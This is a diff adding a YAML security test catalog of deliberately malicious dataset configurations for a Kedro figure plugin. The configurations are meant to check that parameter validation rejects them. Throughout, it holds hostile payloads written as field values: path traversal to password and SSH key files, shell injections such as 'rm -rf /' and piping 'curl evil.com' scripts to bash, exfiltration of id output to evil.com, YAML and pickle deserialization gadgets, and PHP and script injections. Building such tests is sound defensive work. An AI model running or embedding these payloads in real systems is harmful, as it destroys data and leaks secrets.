@@ -1,0 +1,714 @@
+# Security Test Catalog: Parameter Injection Attack Vectors
+#
+# This catalog contains malicious FigureDataSet configurations designed to test
+# parameter validation, injection prevention, and security boundary enforcement
+# per Section 6.6.8.2 of the technical specification.
+#
+# WARNING: This file contains intentionally malicious configurations for security testing.
+# These entries should NEVER be used in production environments.
+
+# =============================================================================
+# FILEPATH PARAMETER INJECTION ATTACKS
+# =============================================================================
+
+# Directory traversal attacks - attempting to escape project boundaries
+path_traversal_attack_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "../../../../etc/passwd"
+  purpose: "exploratory"
+  condition_param: "experiment_type"
+
+path_traversal_attack_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "../../../sensitive_data/credentials.png"
+  purpose: "presentation"
+  style_params:
+    figure.dpi: 300
+
+path_traversal_attack_3:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/../../../../../../usr/bin/malicious.png"
+  purpose: "publication"
+  condition_param: "model_type"
+
+# Absolute path attacks - attempting unauthorized file system access
+absolute_path_attack_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "/etc/shadow"
+  purpose: "exploratory"
+  condition_param: "data_version"
+
+absolute_path_attack_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "/home/user/.ssh/id_rsa"
+  purpose: "presentation"
+  save_args:
+    dpi: 150
+
+absolute_path_attack_3:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "C:\\Windows\\System32\\config\\system"
+  purpose: "publication"
+  condition_param: "os_type"
+
+# Symbolic link exploitation attempts
+symlink_attack_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/../../symlink_to_sensitive"
+  purpose: "exploratory"
+  style_params:
+    figure.facecolor: "white"
+
+symlink_attack_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "/tmp/../../var/www/html/uploads/shell.png"
+  purpose: "presentation"
+  condition_param: "vulnerability_type"
+
+# =============================================================================
+# CONDITION PARAMETER INJECTION ATTACKS
+# =============================================================================
+
+# Command injection through condition parameter names
+condition_param_injection_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/test_output.png"
+  purpose: "exploratory"
+  condition_param: "experiment_type; rm -rf /"
+
+condition_param_injection_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/malicious.png"
+  purpose: "presentation"
+  condition_param: "$(cat /etc/passwd)"
+
+condition_param_injection_3:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/exploit.png"
+  purpose: "publication"
+  condition_param: "`whoami`"
+
+# SQL injection patterns in condition parameters
+condition_param_sql_injection_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/sql_test.png"
+  purpose: "exploratory"
+  condition_param: "experiment'; DROP TABLE users; --"
+
+condition_param_sql_injection_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/sql_attack.png"
+  purpose: "presentation"
+  condition_param: "1 OR 1=1; INSERT INTO admin VALUES('hacker', 'password')"
+
+# LDAP injection through condition parameters
+condition_param_ldap_injection:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/ldap_attack.png"
+  purpose: "publication"
+  condition_param: "admin)(|(password=*))"
+
+# Code injection via condition parameters
+condition_param_code_injection_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/code_injection.png"
+  purpose: "exploratory"
+  condition_param: "__import__('os').system('rm -rf /')"
+
+condition_param_code_injection_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/python_injection.png"
+  purpose: "presentation"
+  condition_param: "eval('__import__(\"subprocess\").call([\"curl\", \"evil.com\"])')"
+
+# =============================================================================
+# STYLE_PARAMS DICTIONARY INJECTION ATTACKS
+# =============================================================================
+
+# Malicious matplotlib rcParams injection
+style_params_injection_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/style_attack.png"
+  purpose: "exploratory"
+  condition_param: "experiment_type"
+  style_params:
+    # Attempting to execute code through rcParams
+    "backend": "eval('__import__(\"os\").system(\"rm -rf /\")')"
+    "figure.dpi": "eval('print(\"HACKED\")')"
+
+style_params_injection_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/rcparams_exploit.png"
+  purpose: "presentation"
+  style_params:
+    # Attempting to access file system through rcParams
+    "savefig.directory": "/etc/"
+    "savefig.format": "../../sensitive_data"
+    "__import__": "os"
+
+style_params_injection_3:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/malicious_style.png"
+  purpose: "publication"
+  condition_param: "model_version"
+  style_params:
+    # Attempting command execution through function calls
+    "figure.facecolor": "subprocess.call(['curl', 'malicious.com'])"
+    "axes.prop_cycle": "__import__('os').getcwd()"
+
+# Type confusion attacks via style_params
+style_params_type_confusion_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/type_confusion.png"
+  purpose: "exploratory"
+  style_params:
+    # Attempting to pass functions instead of values
+    "figure.dpi": !python/object/apply:os.system ["rm -rf /"]
+    "figure.figsize": !python/object/apply:subprocess.call [["curl", "evil.com"]]
+
+style_params_type_confusion_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/yaml_injection.png"
+  purpose: "presentation"
+  condition_param: "data_type"
+  style_params:
+    # YAML deserialization attack
+    "malicious_param": !!python/object/apply:eval ["__import__('os').system('whoami')"]
+
+# =============================================================================
+# SAVE_ARGS PARAMETER EXPLOITATION
+# =============================================================================
+
+# File system exploitation through save_args
+save_args_injection_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/save_exploit.png"
+  purpose: "exploratory"
+  condition_param: "experiment_id"
+  save_args:
+    # Attempting path manipulation through matplotlib parameters
+    facecolor: "../../etc/passwd"
+    edgecolor: "/usr/bin/malicious_script"
+    dpi: "../../../sensitive_directory/"
+
+save_args_injection_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/matplotlib_exploit.png"
+  purpose: "presentation"
+  save_args:
+    # Attempting to exploit matplotlib's file handling
+    bbox_inches: "../../../../var/log/auth.log"
+    pad_inches: "eval('os.system(\"cat /etc/passwd\")')"
+    format: "../../uploads/shell"
+
+save_args_injection_3:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/format_exploit.png"
+  purpose: "publication"
+  condition_param: "output_format"
+  save_args:
+    # Format string attacks
+    format: "%s%s%s%s%s%n"
+    transparent: "__import__('os').system('id')"
+
+# Command injection through save_args
+save_args_command_injection:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/command_injection.png"
+  purpose: "exploratory"
+  save_args:
+    # Attempting command injection through parameter values
+    metadata: "{'Author': '`curl evil.com`'}"
+    dpi: "; wget malicious.com/backdoor.sh; chmod +x backdoor.sh; ./backdoor.sh"
+
+# =============================================================================
+# LOAD_ARGS PARAMETER EXPLOITATION
+# =============================================================================
+
+# File access exploitation through load_args
+load_args_injection_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/load_exploit.png"
+  purpose: "exploratory"
+  condition_param: "input_source"
+  load_args:
+    # Attempting unauthorized file access
+    "source_file": "/etc/shadow"
+    "backup_location": "../../sensitive_data/"
+
+load_args_injection_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/load_attack.png"
+  purpose: "presentation"
+  load_args:
+    # Directory traversal through load parameters
+    "cache_dir": "../../../../usr/bin/"
+    "temp_dir": "../../../var/www/html/"
+
+# =============================================================================
+# PURPOSE PARAMETER EXPLOITATION
+# =============================================================================
+
+# Unauthorized directory access through purpose parameter
+purpose_injection_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/purpose_exploit.png"
+  purpose: "../../etc/"
+  condition_param: "experiment_type"
+
+purpose_injection_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/purpose_attack.png"
+  purpose: "/var/log/../../../etc/passwd"
+  style_params:
+    figure.dpi: 150
+
+purpose_injection_3:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/purpose_traversal.png"
+  purpose: "publication; rm -rf /"
+  condition_param: "data_version"
+
+# Code execution through purpose parameter
+purpose_code_injection_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/purpose_code.png"
+  purpose: "__import__('subprocess').call(['whoami'])"
+
+purpose_code_injection_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/purpose_eval.png"
+  purpose: "eval('print(open(\"/etc/passwd\").read())')"
+
+# =============================================================================
+# VERSIONING PARAMETER INJECTION
+# =============================================================================
+
+# Version manipulation attacks
+version_injection_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/version_attack.png"
+  purpose: "exploratory"
+  condition_param: "model_version"
+  version: "../../etc/passwd"
+
+version_injection_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/version_exploit.png"
+  purpose: "presentation"
+  version: "/usr/bin/malicious_script"
+  save_args:
+    dpi: 300
+
+version_injection_3:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/version_traversal.png"
+  purpose: "publication"
+  version: "v1.0; rm -rf /tmp/*"
+
+# Version command injection
+version_command_injection:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/version_command.png"
+  purpose: "exploratory"
+  condition_param: "dataset_version"
+  version: "`curl evil.com/collect_data.sh | bash`"
+
+# =============================================================================
+# DATASET METADATA MANIPULATION
+# =============================================================================
+
+# Attempting to manipulate dataset type and inheritance
+malicious_dataset_type_1:
+  type: "figregistry_kedro.FigureDataSet; __import__('os').system('whoami')"
+  filepath: "data/08_reporting/type_injection.png"
+  purpose: "exploratory"
+
+malicious_dataset_type_2:
+  type: "__import__('subprocess').call(['curl', 'evil.com'])"
+  filepath: "data/08_reporting/subprocess_injection.png"
+  purpose: "presentation"
+
+# Complex multi-vector attacks combining multiple injection types
+complex_injection_attack_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "../../etc/passwd; curl evil.com/$(whoami)"
+  purpose: "__import__('os').getcwd()"
+  condition_param: "eval('print(\"MULTI_VECTOR_ATTACK\")')"
+  style_params:
+    figure.dpi: "subprocess.call(['rm', '-rf', '/tmp'])"
+    backend: "../../malicious_backend"
+  save_args:
+    format: "; wget malicious.com/backdoor"
+    dpi: "__import__('sys').exit(1)"
+  load_args:
+    source: "/etc/shadow"
+  version: "$(cat /etc/passwd)"
+
+complex_injection_attack_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "/tmp/../../var/www/html/uploads/shell.png"
+  purpose: "publication; curl evil.com/collect_env.sh | bash"
+  condition_param: "`env | grep -i pass`"
+  style_params:
+    malicious_eval: !python/object/apply:eval ["__import__('os').system('id')"]
+    path_traversal: "../../../../sensitive_data/"
+  save_args:
+    bbox_inches: "eval('__import__(\"subprocess\").call([\"curl\", \"evil.com\"])')"
+    metadata: "{'exploit': '`whoami`'}"
+  version: "; rm -rf /*"
+
+# =============================================================================
+# CATALOG ENTRY MANIPULATION ATTEMPTS
+# =============================================================================
+
+# Attempting to override catalog structure
+catalog_structure_attack_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/catalog_override.png"
+  purpose: "exploratory"
+  # Attempting to inject additional catalog entries
+  _malicious_entries:
+    backdoor_dataset:
+      type: "evil_dataset"
+      filepath: "/etc/passwd"
+
+# Attempting catalog inheritance exploitation
+catalog_inheritance_attack:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/inheritance_attack.png"
+  purpose: "presentation"
+  condition_param: "experiment_type"
+  # Attempting to manipulate YAML anchors and references
+  _yaml_injection: &malicious_anchor
+    - "curl evil.com/backdoor.sh"
+    - "chmod +x backdoor.sh"
+    - "./backdoor.sh"
+  style_params:
+    malicious_ref: *malicious_anchor
+
+# =============================================================================
+# TEMPLATE VARIABLE INJECTION
+# =============================================================================
+
+# Kedro template variable exploitation
+template_injection_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "${base_path}/../../../etc/passwd"
+  purpose: "exploratory"
+  condition_param: "${params:malicious_param}"
+
+template_injection_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/${globals.__import__('os').system('whoami')}.png"
+  purpose: "presentation"
+  style_params:
+    figure.dpi: "${params:__import__('subprocess').call(['curl', 'evil.com'])}"
+
+# Environment variable exploitation
+env_var_injection_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/$PATH/malicious.png"
+  purpose: "publication"
+  condition_param: "$HOME/../../../etc/passwd"
+
+env_var_injection_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/env_exploit.png"
+  purpose: "exploratory"
+  save_args:
+    format: "${SHELL} -c 'curl evil.com'"
+    dpi: "$(($(cat /etc/passwd | wc -l)))"
+
+# =============================================================================
+# YAML DESERIALIZATION ATTACKS
+# =============================================================================
+
+# YAML deserialization exploitation attempts
+yaml_deserialization_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/yaml_attack.png"
+  purpose: "exploratory"
+  malicious_object: !!python/object/apply:os.system ["rm -rf /tmp"]
+
+yaml_deserialization_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/deserialization.png"
+  purpose: "presentation"
+  condition_param: "experiment_type"
+  exploit: !!python/object/apply:subprocess.call [["curl", "evil.com/collect_data"]]
+
+# YAML anchor and alias exploitation
+yaml_anchor_attack:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/anchor_attack.png"
+  purpose: "publication"
+  _malicious_command: &exploit_anchor
+    - !!python/object/apply:os.system ["whoami"]
+    - !!python/object/apply:subprocess.call [["curl", "evil.com"]]
+  style_params:
+    malicious_execution: *exploit_anchor
+
+# =============================================================================
+# UNICODE AND ENCODING ATTACKS
+# =============================================================================
+
+# Unicode normalization attacks
+unicode_attack_1:
+  type: figregistry_kedro.FigureDataSet
+  # Using Unicode path traversal characters
+  filepath: "data/08_reporting/\u002E\u002E\u002F\u002E\u002E\u002Fetc\u002Fpasswd"
+  purpose: "exploratory"
+
+unicode_attack_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/unicode_exploit.png"
+  # Unicode in condition parameter
+  condition_param: "\u0065\u0076\u0061\u006C\u0028\u0027\u005F\u005F\u0069\u006D\u0070\u006F\u0072\u0074\u005F\u005F\u0028\u0022\u006F\u0073\u0022\u0029\u002E\u0073\u0079\u0073\u0074\u0065\u006D\u0028\u0022\u0077\u0068\u006F\u0061\u006D\u0069\u0022\u0029\u0027\u0029"
+  purpose: "presentation"
+
+# Double encoding attacks
+double_encoding_attack:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/double_encoding.png"
+  purpose: "publication"
+  condition_param: "%252E%252E%252F%252E%252E%252Fetc%252Fpasswd"
+
+# =============================================================================
+# NULL BYTE INJECTION
+# =============================================================================
+
+# Null byte truncation attacks
+null_byte_attack_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/legit_file.png\x00../../etc/passwd"
+  purpose: "exploratory"
+
+null_byte_attack_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/null_exploit.png"
+  purpose: "presentation"
+  condition_param: "safe_param\x00; rm -rf /"
+
+# =============================================================================
+# RESOURCE EXHAUSTION ATTACKS
+# =============================================================================
+
+# Large parameter attacks
+resource_exhaustion_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/resource_attack.png"
+  purpose: "exploratory"
+  condition_param: "A" * 1000000  # Extremely long parameter
+  style_params:
+    # Large dictionary to exhaust memory
+    massive_param_0: "X" * 100000
+    massive_param_1: "Y" * 100000
+    massive_param_2: "Z" * 100000
+
+# Recursive reference attacks
+recursive_attack:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/recursive.png"
+  purpose: "presentation"
+  _recursive_ref: &self_ref
+    recursive_data: *self_ref
+    more_data: "exploit"
+  style_params:
+    recursive_param: *self_ref
+
+# =============================================================================
+# FORMAT STRING ATTACKS
+# =============================================================================
+
+# Format string exploitation
+format_string_attack_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/format_attack.png"
+  purpose: "exploratory"
+  condition_param: "%s%s%s%s%s%n"
+
+format_string_attack_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/printf_exploit.png"
+  purpose: "presentation"
+  save_args:
+    format: "%08x.%08x.%08x.%08x"
+    metadata: "%s%s%s%s%s%s%s%s%s%s%s%n"
+
+# =============================================================================
+# CONFIGURATION POLLUTION ATTACKS
+# =============================================================================
+
+# Attempting to pollute global configuration
+config_pollution_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/config_pollution.png"
+  purpose: "exploratory"
+  condition_param: "experiment_type"
+  # Attempting to inject global rcParams
+  __global_rcParams__:
+    "savefig.directory": "/etc/"
+    "backend": "malicious_backend"
+
+config_pollution_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/global_injection.png"
+  purpose: "presentation"
+  # Attempting to override global settings
+  __figregistry_global__:
+    output_base_path: "/var/www/html/uploads/"
+    allow_overwrite: true
+    security_checks: false
+
+# =============================================================================
+# TIME-BASED ATTACKS
+# =============================================================================
+
+# Time-based injection attacks
+time_based_attack_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/time_attack.png"
+  purpose: "exploratory"
+  condition_param: "experiment; sleep 30"
+
+time_based_attack_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/timing_exploit.png"
+  purpose: "presentation"
+  save_args:
+    format: "png; ping -c 30 evil.com"
+
+# =============================================================================
+# PROTOCOL EXPLOITATION
+# =============================================================================
+
+# Attempting to exploit URL protocols
+protocol_attack_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "http://evil.com/backdoor.php?cmd=whoami"
+  purpose: "exploratory"
+
+protocol_attack_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "ftp://malicious.com/sensitive_data/"
+  purpose: "presentation"
+  condition_param: "data_source"
+
+protocol_attack_3:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "file:///etc/passwd"
+  purpose: "publication"
+
+# =============================================================================
+# SERIALIZATION ATTACKS
+# =============================================================================
+
+# Pickle deserialization attacks
+pickle_attack_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/pickle_exploit.png"
+  purpose: "exploratory"
+  malicious_pickle: !!binary |
+    gASVOQAAAAAAAABjX19idWlsdGluX18Kc3lzdGVtCnEAVZByZXR1cm4gX19pbXBvcnRfXygIcG9wZW4K
+    KCJjdXJsIGV2aWwuY29tL2JhY2tkb29yIikucmVhZCgpcQFSLg==
+
+# JSON injection attacks
+json_attack_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/json_injection.png"
+  purpose: "presentation"
+  malicious_json: '{"__reduce__": ["eval", ["__import__(\"os\").system(\"whoami\")"]]}'
+
+# =============================================================================
+# REGRESSION BYPASS ATTEMPTS
+# =============================================================================
+
+# Attempting to bypass known security fixes
+bypass_attempt_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/bypass.png"
+  purpose: "exploratory"
+  # Using alternative traversal sequences
+  condition_param: "..\\..\\..\\etc\\passwd"
+
+bypass_attempt_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/alternative_bypass.png"
+  purpose: "presentation"
+  # Mixed case to bypass filters
+  save_args:
+    FORMAT: "PNG; curl Evil.COM"
+
+# =============================================================================
+# POLYGLOT ATTACKS
+# =============================================================================
+
+# Polyglot payloads that work across multiple contexts
+polyglot_attack_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/polyglot.png"
+  purpose: "exploratory"
+  # Payload that works in shell, Python, and SQL contexts
+  condition_param: "'; echo 'polyglot'; __import__('os').system('whoami'); SELECT * FROM users; --"
+
+polyglot_attack_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/multi_context.png"
+  purpose: "presentation"
+  style_params:
+    # Cross-platform payload
+    exploit: "cmd /c echo polyglot & python -c \"import os; os.system('whoami')\" & curl evil.com"
+
+# =============================================================================
+# METADATA INJECTION
+# =============================================================================
+
+# Attempting to inject malicious metadata
+metadata_injection_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/metadata_attack.png"
+  purpose: "exploratory"
+  condition_param: "experiment_type"
+  save_args:
+    metadata:
+      Title: "Legitimate Figure"
+      Author: "`curl evil.com/collect_env.sh | bash`"
+      Subject: "../../etc/passwd"
+      Keywords: "__import__('os').system('whoami')"
+
+metadata_injection_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/exif_exploit.png"
+  purpose: "presentation"
+  save_args:
+    metadata:
+      # EXIF injection attempt
+      EXIF_UserComment: "<?php system($_GET['cmd']); ?>"
+      EXIF_ImageDescription: "<script>fetch('evil.com/steal_data')</script>"
+
+# =============================================================================
+# BLIND INJECTION TESTS
+# =============================================================================
+
+# Blind injection tests that don't produce visible output
+blind_injection_1:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/blind_test.png"
+  purpose: "exploratory"
+  condition_param: "test; curl evil.com/$(id | base64) > /dev/null 2>&1"
+
+blind_injection_2:
+  type: figregistry_kedro.FigureDataSet
+  filepath: "data/08_reporting/silent_exploit.png"
+  purpose: "presentation"
+  save_args:
+    format: "png; python -c \"import urllib.request; urllib.request.urlopen('http://evil.com/exfiltrate?data=' + str(__import__('os').getcwd()))\""
+
+# =============================================================================
+# END OF SECURITY TEST CATALOG
+# =============================================================================
+
+# NOTE: All entries in this file are designed to fail security validation.
+# Successful prevention of these attacks validates the security implementation.
+# Any successful execution of these payloads indicates a security vulnerability.
